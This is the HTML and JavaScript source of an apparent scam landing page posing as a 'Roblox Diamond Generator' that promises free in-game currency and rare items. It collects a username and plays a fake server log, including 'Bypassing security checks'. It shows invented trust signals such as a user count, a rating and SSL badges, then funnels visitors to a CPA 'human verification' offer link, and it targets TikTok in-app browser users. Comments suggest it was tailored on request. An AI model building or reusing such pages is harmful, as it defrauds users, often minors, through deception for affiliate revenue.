<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Diamond Generator - Get FREE R$ Resources</title>
    <!-- Load Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Load Poppins Font -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        /* Custom Tailwind Configuration */
        :root {
            --color-primary: #6C00FF;
            --color-accent: #CFFF04;
        }

        /* Applying the requested font and background gradient */
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #1A1A1A, #2D2D2D);
            min-height: 100vh;
            color: white;
            /* Adjust padding to remove space reserved for fixed footer ads */
            padding-bottom: 20px; 
        }
        
        /* Ensure the fixed footer does not overlap essential content */
        @media (min-width: 768px) {
            body {
                padding-bottom: 20px; /* Minimal padding for desktop */
            }
        }

        /* Custom Colors & Utility Classes */
        .bg-primary { background-color: var(--color-primary); }
        .text-accent { color: var(--color-accent); }
        .bg-accent { background-color: var(--color-accent); }
        .border-primary { border-color: var(--color-primary); }
        .shadow-primary-lg { box-shadow: 0 10px 15px -3px rgba(108, 0, 255, 0.5), 0 4px 6px -2px rgba(108, 0, 255, 0.2); }
        .shadow-accent-lg { box-shadow: 0 10px 15px -3px rgba(207, 255, 4, 0.5), 0 4px 6px -2px rgba(207, 255, 4, 0.2); }

        /* Keyframe for button pulse effect */
        @keyframes pulse-ring {
            0% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(108, 0, 255, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(108, 0, 255, 0); }
            100% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(108, 0, 255, 0); }
        }

        .pulse-effect {
            animation: pulse-ring 2s infinite;
        }

        /* Keyframe for floating animation */
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-8px); }
            100% { transform: translateY(0px); }
        }

        .float-animation {
            animation: float 4s ease-in-out infinite;
        }

        /* Custom styles for the progress ring */
        .progress-ring__circle {
            transition: stroke-dashoffset 0.35s;
            transform: rotate(-90deg);
            transform-origin: 50% 50%;
        }

        /* Custom styles for selection cards */
        .selection-card {
            transition: all 0.2s ease-in-out;
            cursor: pointer;
            border: 2px solid transparent;
        }

        .selection-card:hover {
            transform: translateY(-4px) scale(1.02);
            border-color: var(--color-primary);
            box-shadow: 0 4px 20px rgba(108, 0, 255, 0.5);
        }

        .selection-card.selected {
            border-color: var(--color-accent);
            background-color: rgba(108, 0, 255, 0.2);
            transform: scale(1.05);
            box-shadow: 0 0 25px var(--color-accent);
        }

        /* Custom Shine Effect for Trust Indicators */
        .shine-text {
            background: linear-gradient(90deg, #fff, var(--color-accent), #fff);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 5s infinite;
        }

        @keyframes shine {
            0% { background-position: 200% 0; }
            100% { background-position: -200% 0; }
        }

        /* Custom Transition for Step Switching */
        .step-transition {
            transition: opacity 0.5s ease-in-out;
        }
    </style>
</head>
<body class="selection:bg-accent selection:text-[#1A1A1A]">

    <!-- TikTok Browser Warning Modal -->
    <div id="tiktok-modal" class="fixed inset-0 z-50 hidden items-center justify-center p-4 bg-black bg-opacity-80 backdrop-blur-sm">
        <div class="bg-[#2D2D2D] p-6 rounded-xl shadow-primary-lg max-w-sm w-full border-2 border-primary">
            <h2 class="text-2xl font-bold text-accent mb-3">‚ö†Ô∏è Warning: In-App Browser Detected</h2>
            <p class="text-gray-200 mb-4">You are currently using the TikTok in-app browser. For optimal performance and to complete the verification process, we recommend opening this page in your phone's default browser (Safari/Chrome).</p>
            <div class="space-y-3">
                <button onclick="window.location.href = window.location.href;" class="w-full py-3 bg-accent text-[#1A1A1A] font-bold rounded-xl shadow-accent-lg transition hover:bg-white">
                    Open in Default Browser
                </button>
                <button onclick="document.getElementById('tiktok-modal').classList.add('hidden')" class="w-full py-3 bg-primary text-white font-semibold rounded-xl transition hover:bg-opacity-80">
                    Continue in App (Not Recommended)
                </button>
            </div>
        </div>
    </div>

    <!-- Header Section (Trust Indicators ONLY - Ads Removed) -->
    <header class="p-4 bg-black bg-opacity-20 shadow-xl border-b border-primary/50 sticky top-0 z-40">
        <div class="max-w-4xl mx-auto">
            <div class="flex items-center justify-between flex-wrap gap-4">
                <!-- Trust Indicators -->
                <div class="flex items-center space-x-4">
                    <div class="text-center">
                        <span id="user-counter" class="block text-2xl font-extrabold text-accent shine-text">12000+</span>
                        <span class="text-xs text-gray-400">USERS ONLINE</span>
                    </div>
                    <div class="h-8 w-px bg-gray-600"></div>
                    <div>
                        <div class="text-accent text-lg">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ <span class="text-white text-sm">4.9/5</span></div>
                        <span class="text-xs text-gray-400">Trusted Platform</span>
                    </div>
                </div>

                <!-- Empty space where desktop ad used to be, now removed for cleaner look -->
                <div class="hidden md:block mx-auto">
                    <!-- Ad Slot: Desktop Banner 468x60 (REMOVED) -->
                </div>
            </div>

            <!-- Empty space where mobile ad used to be, now removed -->
            <div class="md:hidden mx-auto mt-4 w-full flex justify-center">
                 <!-- Ad Slot: Mobile Banner 320x50 (REMOVED) -->
            </div>
        </div>
    </header>

    <!-- Main Content Container (No Ads Inside) -->
    <main class="max-w-4xl mx-auto p-4 md:p-8">

        <!-- Step Indicator -->
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-3xl font-extrabold text-white">GENERATOR</h2>
            <div id="step-indicator" class="flex space-x-2 text-sm font-semibold">
                <span class="step-num text-accent">1</span>
                <span class="text-gray-500">/</span>
                <span class="text-gray-500">6</span>
            </div>
        </div>

        <!-- Step Content Area -->
        <div id="generator-steps" class="bg-[#1A1A1A] p-6 md:p-10 rounded-2xl shadow-2xl border-2 border-primary/50">

            <!-- Step 1: Hero Section (Initial Load) -->
            <div id="step-1" class="step-content step-transition text-center">
                <h1 class="text-4xl md:text-5xl font-extrabold mb-4 leading-tight text-white">
                    Unlock <span class="text-accent">FREE</span> Resources
                </h1>
                <p class="text-gray-400 mb-8 max-w-md mx-auto">
                    Get up to 10,000 Diamonds, exclusive Classes, and rare Items instantly for your Roblox account.
                </p>

                <!-- Diamond Counter & Progress Bar -->
                <div class="flex flex-col items-center justify-center space-y-4 mb-10">
                    <div class="relative w-48 h-48 md:w-56 md:h-56">
                        <!-- SVG Progress Ring -->
                        <svg class="absolute inset-0" viewBox="0 0 100 100">
                            <circle cx="50" cy="50" r="45" fill="none" stroke="#2D2D2D" stroke-width="8" />
                            <circle class="progress-ring__circle" id="progress-ring" cx="50" cy="50" r="45" fill="none" stroke="var(--color-primary)" stroke-width="8" stroke-dasharray="282.7" stroke-dashoffset="282.7" />
                        </svg>
                        <!-- Diamond Icon -->
                        <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Roblox Diamond" class="float-animation w-16 h-16 md:w-20 md:h-20 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 rounded-full shadow-lg p-1 bg-[#1A1A1A] border-2 border-accent" />
                        <!-- Animated Counter -->
                        <span id="diamond-count" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 translate-y-8 md:translate-y-10 text-4xl md:text-5xl font-extrabold text-accent">0</span>
                    </div>
                </div>

                <!-- Start Button -->
                <button onclick="nextStep()" class="w-full md:w-2/3 py-4 bg-primary text-white text-xl font-bold rounded-xl mb-6 transition hover:bg-opacity-80 focus:ring-4 focus:ring-accent focus:outline-none pulse-effect">
                    üöÄ START GENERATOR NOW
                </button>

                <!-- How it works (Collapsible) -->
                <div class="mt-4">
                    <button id="how-it-works-toggle" class="w-full text-center py-2 text-sm font-semibold text-gray-400 hover:text-white transition flex items-center justify-center" onclick="toggleFaq()">
                        How does it work?
                        <svg id="faq-arrow" class="w-4 h-4 ml-2 transform transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                    </button>
                    <div id="how-it-works-content" class="text-sm text-gray-500 mt-2 text-left hidden p-4 bg-black/30 rounded-lg">
                        <p>1. Select your desired resources.</p>
                        <p>2. Enter your Roblox username (no password needed).</p>
                        <p>3. Our secure servers simulate the resource generation process.</p>
                        <p>4. Complete a quick human verification to protect against bots, and the resources are instantly added!</p>
                    </div>
                </div>
            </div>

            <!-- Step 2: Selection Process -->
            <div id="step-2" class="step-content step-transition hidden">
                <h2 class="text-3xl font-bold text-accent mb-6">1. Select Resources</h2>

                <!-- Diamonds Selection -->
                <div class="mb-8">
                    <h3 class="text-xl font-semibold mb-3">üíé Choose Diamond Amount</h3>
                    <div class="grid grid-cols-3 gap-3 md:gap-6">
                        <div class="selection-card p-4 rounded-xl border-2 border-[#2D2D2D]" data-resource="diamonds" data-value="2500" onclick="selectResource(this, 'diamonds')">
                            <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Diamond" class="w-12 h-12 mx-auto mb-2 float-animation" style="animation-duration: 5s;">
                            <p class="text-lg font-bold text-center">2,500</p>
                        </div>
                        <div class="selection-card p-4 rounded-xl border-2 border-[#2D2D2D]" data-resource="diamonds" data-value="5000" onclick="selectResource(this, 'diamonds')">
                            <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Diamond" class="w-12 h-12 mx-auto mb-2 float-animation" style="animation-duration: 4s;">
                            <p class="text-lg font-bold text-center">5,000</p>
                        </div>
                        <div class="selection-card p-4 rounded-xl border-2 border-[#2D2D2D]" data-resource="diamonds" data-value="10000" onclick="selectResource(this, 'diamonds')">
                            <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Diamond" class="w-12 h-12 mx-auto mb-2 float-animation" style="animation-duration: 3s;">
                            <p class="text-lg font-bold text-center">10,000</p>
                        </div>
                    </div>
                </div>

                <!-- Class Selection -->
                <div class="mb-8">
                    <h3 class="text-xl font-semibold mb-3">‚öîÔ∏è Select Exclusive Class</h3>
                    <div class="grid grid-cols-3 gap-3 md:gap-6">
                        <div class="selection-card p-4 rounded-xl border-2 border-[#2D2D2D]" data-resource="class" data-value="Assassin" onclick="selectResource(this, 'class')">
                            <img src="https://i.postimg.cc/fTK26j9B/assassin.png" alt="Assassin" class="w-16 h-16 mx-auto mb-2">
                            <p class="text-sm font-semibold text-center">Assassin</p>
                        </div>
                        <div class="selection-card p-4 rounded-xl border-2 border-[#2D2D2D]" data-resource="class" data-value="Cyborg" onclick="selectResource(this, 'class')">
                            <img src="https://i.postimg.cc/wBWCDjjy/cyborg.png" alt="Cyborg" class="w-16 h-16 mx-auto mb-2">
                            <p class="text-sm font-semibold text-center">Cyborg</p>
                        </div>
                        <div class="selection-card p-4 rounded-xl border-2 border-[#2D2D2D]" data-resource="class" data-value="Pyromaniac" onclick="selectResource(this, 'class')">
                            <img src="https://i.postimg.cc/mk9Kx3NC/pyromaniac.png" alt="Pyromaniac" class="w-16 h-16 mx-auto mb-2">
                            <p class="text-sm font-semibold text-center">Pyromaniac</p>
                        </div>
                    </div>
                </div>

                <!-- Item Selection -->
                <div class="mb-8">
                    <h3 class="text-xl font-semibold mb-3">‚ú® Select Rare Item</h3>
                    <div class="grid grid-cols-3 gap-3 md:gap-6">
                        <div class="selection-card p-4 rounded-xl border-2 border-[#2D2D2D]" data-resource="item" data-value="Ice Sword" onclick="selectResource(this, 'item')">
                            <img src="https://i.postimg.cc/YqcJ6VM3/ice-sword.png" alt="Ice Sword" class="w-16 h-16 mx-auto mb-2">
                            <p class="text-sm font-semibold text-center">Ice Sword</p>
                        </div>
                        <div class="selection-card p-4 rounded-xl border-2 border-[#2D2D2D]" data-resource="item" data-value="Trident" onclick="selectResource(this, 'item')">
                            <img src="https://i.postimg.cc/15pbJHzZ/trident.png" alt="Trident" class="w-16 h-16 mx-auto mb-2">
                            <p class="text-sm font-semibold text-center">Trident</p>
                        </div>
                        <div class="selection-card p-4 rounded-xl border-2 border-[#2D2D2D]" data-resource="item" data-value="Cultist King Mace" onclick="selectResource(this, 'item')">
                            <img src="https://i.postimg.cc/7Z9dyZ7s/cultist-king-mace.png" alt="Cultist King Mace" class="w-16 h-16 mx-auto mb-2">
                            <p class="text-sm font-semibold text-center">Cultist King Mace</p>
                        </div>
                    </div>
                </div>

                <!-- Selection Summary -->
                <div class="bg-black/30 p-4 rounded-lg border border-primary mb-6">
                    <h4 class="font-bold text-lg mb-2 text-white">Your Selection:</h4>
                    <p class="text-sm text-gray-300">Diamonds: <span id="summary-diamonds" class="text-accent font-semibold">None</span></p>
                    <p class="text-sm text-gray-300">Class: <span id="summary-class" class="text-accent font-semibold">None</span></p>
                    <p class="text-sm text-gray-300">Item: <span id="summary-item" class="text-accent font-semibold">None</span></p>
                </div>

                <!-- Continue Button (Step 2) -->
                <button id="continue-step-2" onclick="nextStep()" class="w-full py-4 bg-primary text-white text-xl font-bold rounded-xl transition hover:bg-opacity-80 focus:ring-4 focus:ring-accent focus:outline-none disabled:opacity-50" disabled>
                    CONTINUE
                </button>
                <p id="selection-error" class="text-red-400 text-center text-sm mt-3 hidden">Please select one option from all three categories.</p>
            </div>

            <!-- Step 3: Username Input -->
            <div id="step-3" class="step-content step-transition hidden text-center">
                <h2 class="text-3xl font-bold text-accent mb-6">2. Enter Account Details</h2>

                <p class="text-gray-400 mb-6">Please enter your Roblox username. No password is required!</p>

                <input type="text" id="roblox-username" placeholder="Your Roblox Username" class="w-full p-4 mb-4 text-lg bg-[#2D2D2D] border-2 border-primary rounded-xl text-white placeholder-gray-500 focus:border-accent focus:ring-4 focus:ring-accent/50 outline-none transition" required>

                <p id="username-error" class="text-red-400 text-sm mb-4 hidden">Please enter a valid Roblox username.</p>

                <div class="flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4">
                    <button onclick="prevStep()" class="w-full md:w-1/3 py-4 bg-gray-600 text-white text-xl font-bold rounded-xl transition hover:bg-gray-700">
                        CANCEL
                    </button>
                    <button onclick="handleUsernameInput()" class="w-full md:w-2/3 py-4 bg-primary text-white text-xl font-bold rounded-xl transition hover:bg-opacity-80 focus:ring-4 focus:ring-accent focus:outline-none">
                        START GENERATION
                    </button>
                </div>

                <p class="text-xs text-gray-500 mt-6">üîí We respect your privacy. This connection is secure and uses 256-bit SSL encryption. We never ask for your password.</p>
            </div>

            <!-- Step 4: Generation Simulation -->
            <div id="step-4" class="step-content step-transition hidden text-center">
                <h2 class="text-3xl font-bold text-accent mb-6">3. Processing Request...</h2>

                <!-- Animated Console Log -->
                <div class="bg-black/80 p-6 rounded-lg border border-accent/50 max-h-80 overflow-y-auto mb-6">
                    <pre id="console-log" class="text-left text-sm font-mono text-green-400 whitespace-pre-wrap"></pre>
                </div>

                <!-- Animated Loading Bar -->
                <div class="w-full bg-[#2D2D2D] rounded-full h-4 mb-4">
                    <div id="loading-bar" class="bg-accent h-4 rounded-full transition-all duration-300" style="width: 0%"></div>
                </div>

                <p id="status-message" class="text-lg font-semibold text-white">Initializing server connection...</p>
            </div>

            <!-- Step 5: Success Message -->
            <div id="step-5" class="step-content step-transition hidden text-center">
                <div class="text-6xl mb-4">‚úÖ</div>
                <h2 class="text-4xl font-extrabold text-accent mb-4">SUCCESS! Generation Complete</h2>
                <p class="text-gray-300 mb-8 max-w-lg mx-auto">
                    Your resources have been successfully generated and are awaiting final account synchronization. One last step remains.
                </p>

                <div class="bg-black/30 p-6 rounded-lg border border-accent/50 mb-8 inline-block text-left">
                    <h4 class="font-bold text-lg mb-3 text-white">Resources Generated for <span id="success-username" class="text-accent"></span>:</h4>
                    <p class="text-sm text-gray-300">üíé Diamonds: <span id="final-diamonds" class="text-accent font-semibold"></span></p>
                    <p class="text-sm text-gray-300">‚öîÔ∏è Class: <span id="final-class" class="text-accent font-semibold"></span></p>
                    <p class="text-sm text-gray-300">‚ú® Item: <span id="final-item" class="text-accent font-semibold"></span></p>
                </div>

                <!-- Continue Button (Step 5) -->
                <button onclick="nextStep()" class="w-full md:w-2/3 py-4 bg-primary text-white text-xl font-bold rounded-xl transition hover:bg-opacity-80 focus:ring-4 focus:ring-accent focus:outline-none">
                    CONTINUE TO VERIFICATION
                </button>
            </div>

            <!-- Step 6: Human Verification (CPA Link - KEPT) -->
            <div id="step-6" class="step-content step-transition hidden text-center">
                <div class="text-6xl mb-4">ü§ñ</div>
                <h2 class="text-4xl font-extrabold text-accent mb-4">FINAL STEP: Human Verification</h2>
                <p class="text-gray-300 mb-8 max-w-lg mx-auto">
                    Due to high bot activity, you must complete a quick, automated human verification to finalize the injection and receive your resources.
                </p>

                <!-- Security Explanation -->
                <div class="bg-black/30 p-4 rounded-lg border border-red-500 mb-8 inline-block text-left">
                    <h4 class="font-bold text-lg mb-2 text-white">Why Verify?</h4>
                    <ul class="list-disc list-inside text-sm text-gray-400 space-y-1">
                        <li>**Protects** the generator from abuse.</li>
                        <li>**Confirms** you are a human player.</li>
                        <li>**Unlocks** the final resource transfer.</li>
                    </ul>
                </div>

                <!-- CPA Link Button (The final conversion point - KEPT) -->
                <a href="https://installchecker.com/cl/i/1o468e" target="_blank" class="block w-full md:w-2/3 mx-auto py-5 bg-accent text-[#1A1A1A] text-2xl font-extrabold rounded-xl transition hover:bg-white focus:ring-4 focus:ring-primary focus:outline-none pulse-effect" style="animation-duration: 1.5s;">
                    üîí VERIFY NOW & GET RESOURCES
                </a>

                <p class="text-xs text-gray-500 mt-6">
                    (Clicking 'Verify Now' will open a secure verification page. Complete any offer there to finish the process.)
                </p>
            </div>

        </div>

        <!-- Security Badges -->
        <div class="flex justify-center flex-wrap gap-6 mt-10 text-center">
            <div class="flex items-center space-x-2 text-sm text-green-400 font-semibold">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                <span>256-Bit SSL Secured</span>
            </div>
            <div class="flex items-center space-x-2 text-sm text-green-400 font-semibold">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                <span>Instant Delivery</span>
            </div>
        </div>

    </main>

    <!-- Footer Section (CLEANED - Ads Removed) -->
    <footer class="p-4 bg-black bg-opacity-80 border-t border-primary/50 text-center mt-8">
        <!-- All ad slots removed from the footer section to fulfill the request. -->
        <p class="text-xs text-gray-500">¬© 2024 Roblox Resource Generator. All rights reserved. Disclaimer: This tool is for entertainment and testing purposes only.</p>
    </footer>

    <script>
        // Global State
        let currentStep = 1;
        const totalSteps = 6;
        let selectedResources = {
            diamonds: null,
            class: null,
            item: null
        };
        const steps = ['step-1', 'step-2', 'step-3', 'step-4', 'step-5', 'step-6'];

        /**
         * Utility function to hide all steps and show only the current one.
         */
        function showStep(stepIndex) {
            steps.forEach((id, index) => {
                const stepElement = document.getElementById(id);
                if (stepElement) {
                    if (index + 1 === stepIndex) {
                        stepElement.classList.remove('hidden');
                        setTimeout(() => stepElement.style.opacity = '1', 10);
                    } else {
                        stepElement.style.opacity = '0';
                        setTimeout(() => stepElement.classList.add('hidden'), 500); // Wait for transition
                    }
                }
            });
            document.getElementById('step-indicator').innerHTML = `<span class="step-num text-accent">${stepIndex}</span> <span class="text-gray-500">/</span> <span class="text-gray-500">${totalSteps}</span>`;

            // Special handling for Step 1 animations
            if (stepIndex === 1) {
                animateDiamondCounter(0, 10000, 2000);
                animateProgressRing(0, 100, 2000);
            }
        }

        /**
         * Moves to the next step.
         */
        function nextStep() {
            if (currentStep < totalSteps) {
                currentStep++;
                showStep(currentStep);
            }
        }

        /**
         * Moves to the previous step (used by cancel button in step 3).
         */
        function prevStep() {
            if (currentStep > 1) {
                currentStep--;
                showStep(currentStep);
            }
        }

        /**
         * Animation for the diamond counter (Step 1).
         */
        function animateDiamondCounter(start, end, duration) {
            const countElement = document.getElementById('diamond-count');
            let startTime = null;

            function step(timestamp) {
                if (!startTime) startTime = timestamp;
                const progress = timestamp - startTime;
                const value = Math.min(progress / duration, 1);
                const currentCount = Math.floor(start + value * (end - start));
                countElement.textContent = currentCount.toLocaleString();

                if (progress < duration) {
                    window.requestAnimationFrame(step);
                } else {
                    countElement.textContent = end.toLocaleString();
                }
            }
            window.requestAnimationFrame(step);
        }

        /**
         * Animation for the circular progress ring (Step 1).
         */
        function animateProgressRing(start, end, duration) {
            const circle = document.getElementById('progress-ring');
            const circumference = 282.7; // 2 * pi * 45
            let startTime = null;

            function step(timestamp) {
                if (!startTime) startTime = timestamp;
                const progress = timestamp - startTime;
                const value = Math.min(progress / duration, 1);
                const offset = circumference - value * circumference;
                circle.style.strokeDashoffset = offset;

                if (progress < duration) {
                    window.requestAnimationFrame(step);
                }
            }
            window.requestAnimationFrame(step);
        }

        /**
         * Handles resource selection in Step 2.
         */
        function selectResource(element, type) {
            const value = element.getAttribute('data-value');
            const container = element.parentElement;

            // Clear previous selection visually
            container.querySelectorAll('.selection-card').forEach(card => {
                card.classList.remove('selected');
            });

            // Set new selection
            element.classList.add('selected');
            selectedResources[type] = value;

            // Update summary
            document.getElementById(`summary-${type}`).textContent = value.toLocaleString();

            // Check if all resources are selected to enable continue button
            checkSelectionCompletion();
        }

        /**
         * Checks if diamonds, class, and item are all selected.
         */
        function checkSelectionCompletion() {
            const allSelected = selectedResources.diamonds && selectedResources.class && selectedResources.item;
            const button = document.getElementById('continue-step-2');
            if (allSelected) {
                button.disabled = false;
                document.getElementById('selection-error').classList.add('hidden');
            } else {
                button.disabled = true;
                document.getElementById('selection-error').classList.remove('hidden');
            }
        }

        /**
         * Handles username input validation and proceeds to Step 4.
         */
        function handleUsernameInput() {
            const usernameInput = document.getElementById('roblox-username');
            const username = usernameInput.value.trim();
            const errorElement = document.getElementById('username-error');

            if (username.length < 3) {
                errorElement.classList.remove('hidden');
                usernameInput.focus();
                return;
            }

            errorElement.classList.add('hidden');
            selectedResources.username = username;
            startGenerationSimulation();
            nextStep();
        }

        /**
         * Runs the generation simulation in Step 4.
         */
        function startGenerationSimulation() {
            const consoleLog = document.getElementById('console-log');
            const loadingBar = document.getElementById('loading-bar');
            const statusMessage = document.getElementById('status-message');
            consoleLog.textContent = ''; // Clear previous log

            const steps = [
                { status: `[INFO] Connecting to secured Roblox API gateway...`, delay: 1000, progress: 10 },
                { status: `[VERIFY] Validating username: ${selectedResources.username}`, delay: 1500, progress: 25 },
                { status: `[RESOURCE] Confirming Diamond amount: ${selectedResources.diamonds.toLocaleString()}`, delay: 1000, progress: 40 },
                { status: `[RESOURCE] Locking in Class: ${selectedResources.class}`, delay: 1000, progress: 55 },
                { status: `[RESOURCE] Locking in Item: ${selectedResources.item}`, delay: 1000, progress: 70 },
                { status: `[SERVER] Initializing resource injection sequence...`, delay: 1500, progress: 85 },
                { status: `[TRANSFER] Bypassing security checks. 100% complete.`, delay: 1500, progress: 100, final: true }
            ];

            let totalDelay = 0;

            steps.forEach((step, index) => {
                totalDelay += step.delay;

                setTimeout(() => {
                    consoleLog.textContent += `> ${step.status}\n`;
                    consoleLog.scrollTop = consoleLog.scrollHeight;
                    loadingBar.style.width = `${step.progress}%`;
                    statusMessage.textContent = step.status.replace(/\[.*\]\s*/, '',); // Update status below bar

                    if (step.final) {
                        // Move to success step after a brief pause
                        setTimeout(() => {
                            updateSuccessStep();
                            nextStep();
                        }, 500);
                    }
                }, totalDelay);
            });
        }

        /**
         * Updates the content of Step 5 (Success message).
         */
        function updateSuccessStep() {
            document.getElementById('success-username').textContent = selectedResources.username;
            document.getElementById('final-diamonds').textContent = selectedResources.diamonds.toLocaleString();
            document.getElementById('final-class').textContent = selectedResources.class;
            document.getElementById('final-item').textContent = selectedResources.item;
        }

        /**
         * Toggles the 'How it works' collapsible section.
         */
        function toggleFaq() {
            const content = document.getElementById('how-it-works-content');
            const arrow = document.getElementById('faq-arrow');
            content.classList.toggle('hidden');
            arrow.classList.toggle('rotate-180');
        }

        /**
         * Detects if the page is opened in the TikTok in-app browser.
         */
        function checkTikTokBrowser() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const modal = document.getElementById('tiktok-modal');

            // Detects common in-app browsers, particularly TikTok
            if (/\b(TikTok|Instagram|FBAV|FBAN|Twitter|LinkedInApp|Pinterest|Snapchat)\b/i.test(ua) && !/Safari/i.test(ua)) {
                // Check specifically for TikTok if possible, or use general in-app warning
                if (/\bTikTok/i.test(ua)) {
                    modal.classList.remove('hidden');
                    modal.classList.add('flex');
                }
            }
        }


        // Initialization on window load
        window.onload = function() {
            // Start Step 1 animations and logic
            showStep(1);
            animateDiamondCounter(0, 10000, 2000);
            animateProgressRing(0, 100, 2000);
            checkTikTokBrowser(); // Check for in-app browser
        };
    </script>
</body>
</html>

